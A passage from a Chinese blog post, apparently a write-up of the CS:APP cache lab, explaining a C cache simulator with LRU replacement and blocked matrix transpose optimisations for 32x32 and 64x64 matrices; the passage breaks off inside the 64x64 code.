如果有这一行，那么就命中，如果不成功，那么就需要找出一个空行，或者根据lru找出一行来替换</li><li>store呢，其实在不考虑实际的写入写出的情况下，和load的操作一模一样，如果cache有这一行，那么就命中了，直接store进去，如果没有这一行，需要读入cache。那其实这个时候就没必要store回内存了，因为刚刚才从内存里读出来。我是感觉这里有点奇怪的。</li><li>modiy在实验文档里也说了，等于load+store</li></ol><p>综上所述，load和store的实现完全一样，modify相当于再操作一次。对应在代码里就是这样。<br>这个函数的第一行和第二行就是使用位运算取出了这个地址的set和tag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Func</span><span class="hljs-params">(<span class="hljs-type">char</span> command, <span class="hljs-type">int</span> address, <span class="hljs-type">int</span> size)</span> &#123;<br>  <span class="hljs-type">int</span> set_num = (address &gt;&gt; b) &amp; ((<span class="hljs-number">1</span> &lt;&lt; s) - <span class="hljs-number">1</span>);<br>  <span class="hljs-type">int</span> tag = (address &gt;&gt; (b + s)) &amp; ((<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-number">32</span> - b - s)) - <span class="hljs-number">1</span>);<br>  FindCache(set_num, tag);<br>  <span class="hljs-keyword">if</span> (command == <span class="hljs-string">&#x27;M&#x27;</span>) &#123;<br>    FindCache(set_num, tag);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="关键的FindCache函数"><a href="#关键的FindCache函数" class="headerlink" title="关键的FindCache函数"></a>关键的FindCache函数</h2><p>通过这个函数可以发现，其实真正关键的函数是FindCache函数。<br>这个函数其实就是遍历这个对应的set的所有行</p><ol><li>如果命中了，则更新命中的次数，更新时间戳，然后直接返回</li><li>如果没命中，我们在遍历所有行的过程中需要记录是否存在空行，并且记录时间戳最小的行（LRU）。<ol><li>首先，更新miss的次数</li><li>如果存在空行，则将当前这一行写入空行，并更新valid，tag，和时间戳</li><li>如果不存在空间，则将当前这一行写入时间戳最小的行，并和2一样更新各种参数。这种情况还要额外更新一个淘汰页的数量<br>具体实现如下<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">FindCache</span><span class="hljs-params">(<span class="hljs-type">int</span> set_num, <span class="hljs-type">int</span> tag)</span> &#123;<br>  cache_line *cur_set = cache[set_num];<br>  <span class="hljs-type">int</span> empty_index = <span class="hljs-number">-1</span>;<br>  <span class="hljs-type">int</span> min_ts_line_index = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; E; i++) &#123;<br>    <span class="hljs-comment">// 当前行存在于cache中，即valid=1，并且tag相同</span><br>    <span class="hljs-keyword">if</span> (cur_set[i].valid == <span class="hljs-number">1</span> &amp;&amp; cur_set[i].tag == tag) &#123;<br>      hit_count++;<br>      <span class="hljs-comment">// 记得更新时间戳</span><br>      cur_set[i].time_stamp = time_stamp++;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 如果存在空行，即valid=0；</span><br>    <span class="hljs-keyword">if</span> (cur_set[i].valid == <span class="hljs-number">0</span>) &#123;<br>      empty_index = i;<br>    &#125;<br>    <span class="hljs-comment">// 记录时间戳最小的，实在不行就要去替换了</span><br>    <span class="hljs-keyword">if</span> (cur_set[i].time_stamp &lt; cur_set[min_ts_line_index].time_stamp) &#123;<br>      min_ts_line_index = i;<br>    &#125;<br>  &#125;<br>  <span class="hljs-comment">// 如果没有命中，那么就发生了miss</span><br>  miss_count++;<br>  <span class="hljs-comment">// 载入某一行，如果有空行，就载入空行</span><br>  <span class="hljs-comment">// 如果没有空行，则载入时间戳最小的，这就发生了evict</span><br>  <span class="hljs-keyword">if</span> (empty_index != <span class="hljs-number">-1</span>) &#123;<br>    LoadOrEvict(cur_set, empty_index, tag);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    LoadOrEvict(cur_set, min_ts_line_index, tag);<br>    eviction_count++;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h2 id="整体代码结构"><a href="#整体代码结构" class="headerlink" title="整体代码结构"></a>整体代码结构</h2><p>这个实验的关键部分就这么多。剩下的有点类似于脏活累活，但是也很有意义。先看一下整体的代码结构<br>可以分为以下几个部分</p><ol><li>解析命令行参数</li><li>根据解析出来的参数初始化我们的cache</li><li>读取文件里的操作，并进行操作</li><li>输出结果</li><li>释放申请的变量<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>  <span class="hljs-comment">// 解析命令行参数</span><br>  <span class="hljs-type">int</span> par_res = parser(argc, argv);<br>  <span class="hljs-keyword">if</span> (par_res == <span class="hljs-number">-1</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-comment">// 创造cache，初始化cache</span><br>  Init();<br>  <span class="hljs-comment">// 读取文件，获得操作，进行操作</span><br>  <span class="hljs-type">int</span> get_res = GetOperation();<br>  <span class="hljs-keyword">if</span> (get_res == <span class="hljs-number">-1</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-comment">// 输出结果</span><br>  printSummary(hit_count, miss_count, eviction_count);<br>  <span class="hljs-comment">// 释放malloc申请的变量</span><br>  Destory();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="命令行参数解析部分"><a href="#命令行参数解析部分" class="headerlink" title="命令行参数解析部分"></a>命令行参数解析部分</h2><p>首先是我们通过命令行启动程序，那么我们的参数都是在命令行中给出的，如何解析命令行的参数呢？需要使用<code>getopt</code>函数。<br>这个函数的三个参数</p><ol><li>程序参数的数量</li><li>argv可以理解为一个二维数组，如果我们的输入是这样的<code>./my_program -f input.txt -o output.txt</code>，那么argv的实际参数是这样的<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">argv[<span class="hljs-number">0</span>] -&gt; <span class="hljs-string">&quot;./my_program&quot;</span><br>argv[<span class="hljs-number">1</span>] -&gt; <span class="hljs-string">&quot;-f&quot;</span><br>argv[<span class="hljs-number">2</span>] -&gt; <span class="hljs-string">&quot;input.txt&quot;</span><br>argv[<span class="hljs-number">3</span>] -&gt; <span class="hljs-string">&quot;-o&quot;</span><br>argv[<span class="hljs-number">4</span>] -&gt; <span class="hljs-string">&quot;output.txt&quot;</span><br></code></pre></td></tr></table></figure></li><li>第三个参数是我们参数的format，如果是这样的”hvs:E:b:t:”，那就说明我们有hvsEbt这六种参数，并且后面跟着冒号的说明这些参数还有值<br>这个函数的返回值，这里用opt记录，就是读取到的参数。<br>最后还有一个变量叫optrag，这个需要我们声明，只要我们正确声明了getopt函数的头文件，这个变量就存在了。代表了当前参数对应的值。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">parser</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>  <span class="hljs-comment">// 解析参数</span><br>  <span class="hljs-type">int</span> opt;<br>  <span class="hljs-keyword">while</span> ((opt = getopt(argc, argv, <span class="hljs-string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="hljs-number">-1</span>) &#123;<br>    <span class="hljs-keyword">switch</span> (opt) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;h&#x27;</span>:<br>      h_flag = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:<br>      v_flag = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>      s = atoi(optarg);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;E&#x27;</span>:<br>      E = atoi(optarg);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:<br>      b = atoi(optarg);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;t&#x27;</span>:<br>      tracefile = optarg;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;?&#x27;</span>:<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未知选项或缺少参数\n&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="初始化cache部分"><a href="#初始化cache部分" class="headerlink" title="初始化cache部分"></a>初始化cache部分</h2><p>首先，我们的cache的定义是这样的<code>cacheline ** cache</code>，因此要用二维数组的方式对这个cache进行初始化。<br>先分配出S个行，然后给每行分配出E列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Init</span><span class="hljs-params">()</span> &#123;<br>  S = <span class="hljs-number">1</span> &lt;&lt; s;<br>  cache = (cache_line **)<span class="hljs-built_in">malloc</span>(S * <span class="hljs-keyword">sizeof</span>(cache_line *));<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; S; i++) &#123;<br>    cache[i] = (cache_line *)<span class="hljs-built_in">malloc</span>(E * <span class="hljs-keyword">sizeof</span>(cache_line));<br>    <span class="hljs-comment">// 记得初始化每一行的tag为0</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; E; j++) &#123;<br>      cache[i][j].tag = <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="读取文件的操作"><a href="#读取文件的操作" class="headerlink" title="读取文件的操作"></a>读取文件的操作</h2><p>首先，我们读取进来的tracefile其实只是一个文件名，还需要根据这个文件名去真正的取到这个文件<br>这就要使用这个了<code>FILE *file_ptr;</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">GetOperation</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-comment">// 读取文件，获得访问记录</span><br>  file_ptr = fopen(tracefile, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> (file_ptr == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;无法打开文件 %s\n&quot;</span>, tracefile);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];<br>  <span class="hljs-type">char</span> command;<br>  <span class="hljs-type">int</span> address;<br>  <span class="hljs-type">int</span> size;<br>  <span class="hljs-keyword">while</span> (fgets(buffer, <span class="hljs-keyword">sizeof</span>(buffer), file_ptr)) &#123;<br>    <span class="hljs-keyword">if</span> (buffer[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;I&#x27;</span>) &#123;<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buffer, <span class="hljs-string">&quot; %c %x,%d&quot;</span>, &amp;command, &amp;address, &amp;size) == <span class="hljs-number">3</span>) &#123;<br>      <span class="hljs-comment">// 成功获取操作</span><br>      Func(command, address, size);<br>      <span class="hljs-comment">// printf(&quot;%c %x,%d\n&quot;, command, address, size);</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// 输入不合法</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>  &#125;<br>  fclose(file_ptr);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="释放内存的操作"><a href="#释放内存的操作" class="headerlink" title="释放内存的操作"></a>释放内存的操作</h2><p>申请了多少就释放多少，先释放列，再释放行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Destory</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; S; i++) &#123;<br>    <span class="hljs-built_in">free</span>(cache[i]);<br>  &#125;<br>  <span class="hljs-built_in">free</span>(cache);<br>&#125;<br></code></pre></td></tr></table></figure><p>整体来说，这个实验并不难。因为根本没用到什么难的算法，暴力遍历就完事了。<br>但是因为前前后后所有内容都需要自己实验，还是有不少dirtywork的，这可能比较像真正工作上写的代码，而不是算法题的代码</p><h1 id="cache转置"><a href="#cache转置" class="headerlink" title="cache转置"></a>cache转置</h1><p>给我们的cache配置是<code>s = 5, E = 1, b = 5</code><br>即有32个set，每个set有一行，即直接映射，每一行可以存储32字节，即每个set可以存储8个整数</p><h2 id="32×32"><a href="#32×32" class="headerlink" title="32×32"></a>32×32</h2><p>首先，我们要做的是尽量减少miss，即让我们的cache尽可能的去命中。<br>那么如果直接按照一行一行的操作，会有什么问题呢？</p><ol><li>对于A，问题倒还好，只要B不会干扰到它的行，那么A的命中率就是7&#x2F;8</li><li>但是对于B呢？B是按列来访问的，极有可能cache命中的次数为0<br>那么分块又是为什么可以优化呢？<br>因为分块的情况下，加入是按4×4的大小分块，那么我们最多使用B的某4列，那么B的命中率很有可能达到3&#x2F;4，为什么说是很可能呢，因为A和B之间可能也会有点干扰，但是这总比之前很可能命中率为0好。<br>综上所述，通过分块是有可能有效降低cache miss的次数的，现在就要研究到底怎么分块了。<br>32×32代表的是每行每列都是32个整数，可以去看<a href="https://wdxtub.com/csapp/thick-csapp-lab-4/2016/04/16/">这位大佬的图</a><br>可以发现，如果通过8×8的分块方式，这个8×8的小块内部是不会冲突的</li><li>这个不冲突对于A来说其实没啥用，因为A本来就是按行来访问的</li><li>但是对B来说，这就很重要了，因为B是按列来访问的，如果这个小块内部冲突，那B就会不断的替换cache<br>由此可以写出下面这个代码。但是可以发现这个代码拿不到满分，因为满分要求300次miss以内，而这个代码是343<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">transpose_submit</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span> &#123;<br>  <span class="hljs-comment">// i和j枚举出了每个8×8的矩阵的左顶点</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i += <span class="hljs-number">8</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">32</span>; j += <span class="hljs-number">8</span>) &#123;<br>      <span class="hljs-comment">// cnti和cntj则分别枚举这个小矩阵的行和列</span><br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cnti = <span class="hljs-number">0</span>; cnti &lt; <span class="hljs-number">8</span>; cnti++) &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> cntj=<span class="hljs-number">0</span>;cntj&lt;<span class="hljs-number">8</span>;cntj++)&#123;<br>            B[j+cntj][i+cnti]=A[i+cnti][j+cntj];<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>为什么呢？因为，A和B之间存在打架的情况。通过打印地址是可以发现A和B的距离很尴尬，使得A和B的任意一个cacheline都是映射到同一个cache。</li><li>其实这也没太大关系，因为我们在A和B中取的8×8的块并不是相同位置，而是根据对角线对称之后的位置，这是没关系的，因为根据上面那位大佬博客里的图可以发现，对称之后其实A和B就不会撞车。</li><li>但是，在对角线的时候，就会出现问题，这时候A和B会撞车。那么该如何优化呢？</li></ol><p>可以通过csapp第五章介绍的循环展开的方式来优化，我们可以提前把A的这一行的八个int给取出来，这会将它放到寄存器里，然后我们再去修改B，这时候就不会撞车了。具体实现如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">transpose_submit</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span> &#123;<br>  <span class="hljs-comment">// i和j枚举出了每个8×8的矩阵的左顶点</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i += <span class="hljs-number">8</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">32</span>; j += <span class="hljs-number">8</span>) &#123;<br>      <span class="hljs-comment">// cnt枚举的是小矩阵的行数</span><br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> cnt=<span class="hljs-number">0</span>;cnt&lt;<span class="hljs-number">8</span>;cnt++)&#123;<br>        <span class="hljs-type">int</span> temp1 = A[i + cnt][j];<br>        <span class="hljs-type">int</span> temp2 = A[i + cnt][j + <span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span> temp3 = A[i + cnt][j + <span class="hljs-number">2</span>];<br>        <span class="hljs-type">int</span> temp4 = A[i + cnt][j + <span class="hljs-number">3</span>];<br>        <span class="hljs-type">int</span> temp5 = A[i + cnt][j + <span class="hljs-number">4</span>];<br>        <span class="hljs-type">int</span> temp6 = A[i + cnt][j + <span class="hljs-number">5</span>];<br>        <span class="hljs-type">int</span> temp7 = A[i + cnt][j + <span class="hljs-number">6</span>];<br>        <span class="hljs-type">int</span> temp8 = A[i + cnt][j + <span class="hljs-number">7</span>];<br><br>        B[j][i + cnt] = temp1;<br>        B[j + <span class="hljs-number">1</span>][i + cnt] = temp2;<br>        B[j + <span class="hljs-number">2</span>][i + cnt] = temp3;<br>        B[j + <span class="hljs-number">3</span>][i + cnt] = temp4;<br>        B[j + <span class="hljs-number">4</span>][i + cnt] = temp5;<br>        B[j + <span class="hljs-number">5</span>][i + cnt] = temp6;<br>        B[j + <span class="hljs-number">6</span>][i + cnt] = temp7;<br>        B[j + <span class="hljs-number">7</span>][i + cnt] = temp8;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结来说</p><ol><li>避免自己跟自己冲突，因此选择8×8，而不是9×9或以上</li><li>避免别人和自己冲突，这里采用了让寄存器来帮忙的方法</li></ol><h2 id="64×64"><a href="#64×64" class="headerlink" title="64×64"></a>64×64</h2><p>64×64就不能直接用8×8了，同样可以先看上面那位大佬的博客画的，使用8乘8的矩阵，自己就和自己冲突了。<br>而如果使用4×4的，小矩阵内部倒不会冲突，但是因为每次取8个，结果只用了4个，后面还得再取一次，又要碰撞一次。<br>所以，8×8地访问还是最适合的，因为不会出现二次访问的需求。但是如果直接使用8×8的方式，又会导致自己不断地撞自己。<br>那综合一下上面的问题，</p><ol><li>主要就是我们每次取一个cacheline，这个cacheline都包括了8个数字</li><li>但是我们如果用4×4的小矩阵去处理，就会导致同一行需要取两次</li><li>而如果直接使用8×8去取，会导致列操作的那个矩阵不断地撞自己。</li></ol><p>有一些大佬就提出了一种方法，我们以8×8的小矩阵去取数据，然后将它分成4个4×4的小矩阵</p><ol start="4"><li>当我们处理A的左上小矩阵时，需要将它放到B的左上小矩阵，这时候我们的cache里有A的4个cache行，B的4个cache行（不在对角线的情况下）</li><li>正常情况下，我们会去操作A的右上小矩阵，将它放到B的左下小矩阵。注意，在这个时候，我们操作A的右上小矩阵是不会发生cache miss的，因为A的前4个cache行就在cache中。但是如果我们访问B的左下小矩阵，那就出问题了。因为B的下4个cache行和B的上4个cache行冲突了。</li><li>但是如果我们不正常，我们把A的右上小矩阵，存到B的右上小矩阵中，那就不会发生额外的碰撞了。因为只涉及了A和B的前4个cache行。</li></ol><p>那么如果操作到这里，A的前4个cache行已经全部用完了，后面不会再访问了，并且除去对角线情况，命中率应该是7&#x2F;8</p><p>接下来，我们操作A的左下矩阵，将其放到B的右上矩阵。而B的右上矩阵暂存了A的右上矩阵，这个矩阵应该是放到B的左下矩阵的。所以接下来的这一波操作是关键。</p><ol start="7"><li>首先，我们按列取出A的左下矩阵，然后按行取出B的右上矩阵</li><li>接下来，将B的右上矩阵置为A的左下矩阵，然后将B的左下矩阵置为取出的B的右上矩阵<br>这里有个细节，就在于我们是按行取出B的右上矩阵的。为什么说它细节呢？</li><li>首先，我们进行到这个阶段的时候，cache中有B的前4行cacheline。</li><li>而我们这个阶段需要修改B的左下矩阵，这就涉及到了B的下4行。</li><li>如果我们在这个阶段按行操作B<ol><li>那么取出B的右上矩阵的某一行（这一行存的其实是B的左下矩阵的值，如果不清楚，回去看看第一波操作）</li><li>然后我们再紧接着将这一行修改为正确的值，</li></ol></li><li>至此，B的这一行将永远不再需要被访问。然后它就会被下4行中对应的那一个给替换掉。<br>而如果是按列取出B的右上矩阵呢？那就不断地碰撞，miss。</li></ol><p>最后一波操作，就是把A的右下矩阵给放到B的右下矩阵中去，这就很轻松了，基本不会miss。<br>代码实现如下，这个操作说起来还是很抽象的，对着代码看，更加清楚。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">deal_64_64</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span> &#123;<br>  <span class="hljs-comment">// i和j枚举出了每个8×8的矩阵的左顶点</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i += <span class="hljs-number">8</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">64</span>; j += <span class="hljs-number">8</span>) &#123;<br>      <span class="hljs-type">int</span> temp1, temp2, temp3, temp4, temp5, temp6, temp7, temp8;<br>      <span class="hljs-type">int</span> cnti, cntj;<br>      <span class="hljs-comment">// 现在处理A的左上4×4，顺便操作一下A的右上4×4</span><br>      <span class="hljs-keyword">for</span> (cnti = <span class="hljs-number">0</span>; cnti &lt; <span class="hljs-number">4</span>; cnti++) &#123;<br>        <span class="hljs-comment">// 取出A的左上，以行的方式</span><br>        temp1 = A[i + cnti][j];<br>        temp2 = A[i + cnti][j + <span class="hljs-number">1</span>];<br>        temp3 = A[i + cnti][j + <span class="hljs-number">2</span>];<br>        temp4 = A[i + cnti][j + <span class="hljs-number">3</span>];<br>        <span class="hljs-comment">// 取出A的右上，以行的方式</span><br>        temp5 = A[i + cnti][j + <span class="hljs-number">4</span>];<br>        temp6 = A[i + cnti][j + <span class="hljs-number">5</span>];<br>        temp7 = A[i + cnti][j + <span class="hljs-number">6</span>];<br>        temp8 = A[i + cnti][j + <span class="hljs-number">7</span>];<br>        <span class="hljs-comment">// 将A的左上放到正确的地方，以列的方式</span><br>        B[j][i + cnti] = temp1;<br>        B[j + <span class="hljs-number">1</span>][i + cnti] = temp2;<br>        B[j + <span class="hljs-number">2</span>][i + cnti] = temp3;<br>        B[j + <span class="hljs-number">3</span>][i + cnti] = temp4;<br>        <span class="hljs-comment">// 